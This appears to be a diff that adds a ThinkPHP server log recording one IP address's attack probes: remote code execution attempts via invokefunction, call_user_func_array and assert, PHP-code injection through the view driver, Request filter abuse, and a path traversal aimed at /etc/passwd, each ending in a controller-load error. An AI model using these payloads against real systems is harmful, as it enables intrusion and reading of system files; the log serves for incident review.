@@ -1,0 +1,97 @@
+[ 2024-01-17T19:06:24+08:00 ] 118.107.7.228 /?s=admin/\think\module/action/param1/${@phpinfo()}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000027s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000761s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001650s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001776s ]
+ERR: 无法加载控制器:\think\module
+
+[ 2024-01-17T20:01:53+08:00 ] 118.107.7.228 /?function=call_user_func_array&s=admin/\think\Container/invokefunction&vars[0]=phpinfo&vars[1][]=-1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000028s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000795s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000975s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001085s ]
+ERR: 无法加载控制器:\think\Container
+
+[ 2024-01-17T20:01:53+08:00 ] 118.107.7.228 /?function=call_user_func_array&s=admin/\think\Container/invokefunction&vars[0]=assert&vars[1][]=phpinfo()
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000597s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000677s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000826s ]
+ERR: 无法加载控制器:\think\Container
+
+[ 2024-01-17T20:46:07+08:00 ] 118.107.7.228 /?s=admin
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000626s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000914s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001065s ]
+
+[ 2024-01-17T20:46:08+08:00 ] 118.107.7.228 /?s=admin
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000033s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001042s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001115s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001263s ]
+
+[ 2024-01-17T21:28:23+08:00 ] 118.107.7.228 /?function=call_user_func_array&s=/admin/\think\app/invokefunction&vars[0]=phpinfo&vars[1][]=-1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000545s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000756s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000839s ]
+ERR: 无法加载控制器:\think\app
+
+[ 2024-01-17T21:28:24+08:00 ] 118.107.7.228 /?function=call_user_func_array&s=/admin/\think\app/invokefunction&vars[0]=assert&vars[1][]=phpinfo()
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000073s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000739s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000778s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000857s ]
+ERR: 无法加载控制器:\think\app
+
+[ 2024-01-17T21:28:24+08:00 ] 118.107.7.228 /?content=<?php%20phpinfo()?>&s=/admin/\think\view\driver\php/display
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000449s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000536s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000600s ]
+ERR: 无法加载控制器:\think\view\driver\php
+
+[ 2024-01-17T22:17:02+08:00 ] 118.107.7.228 /?data=-1&filter[]=phpinfo&s=admin/\think\Request/input
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000692s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001042s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001145s ]
+ERR: 无法加载控制器:\think\Request
+
+[ 2024-01-17T22:17:02+08:00 ] 118.107.7.228 /?filter=assert&s=admin/\think\request/input?data[]=phpinfo()
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000578s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000884s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001054s ]
+ERR: 无法加载控制器:\think\request
+
+[ 2024-01-17T22:36:38+08:00 ] 118.107.7.228 /?errfile=../../../../../../../../../../../../etc/passwd&errline=1&errno=1&errstr=1&s=admin/think\\Error/appError
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000302s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000398s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000440s ]
+ERR: 无法加载控制器:Think\\Error
+
